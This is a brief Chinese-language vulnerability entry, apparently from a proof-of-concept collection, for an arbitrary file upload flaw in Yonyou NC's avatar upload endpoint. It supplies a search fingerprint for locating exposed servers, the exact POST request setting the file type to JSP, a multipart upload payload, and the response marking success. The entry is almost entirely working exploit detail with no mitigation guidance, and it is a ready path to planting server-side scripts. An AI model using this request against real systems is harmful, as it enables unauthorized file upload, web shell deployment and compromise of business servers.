# 用友NCavatar任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`body="/Client/Uclient/UClient.exe"`
- **请求**：`POST /uapim/upload/avatar?usercode=qbll&fileType=jsp HTTP/1.1`

**Payload**
```
------v6bavojmqudas7g0al2o
Content-Disposition: form-data; name="uploadedfile"; filename="dudesuite.txt"
dudesuite
------v6bavojmqudas7g0al2o--
```
- **响应特征**：200 true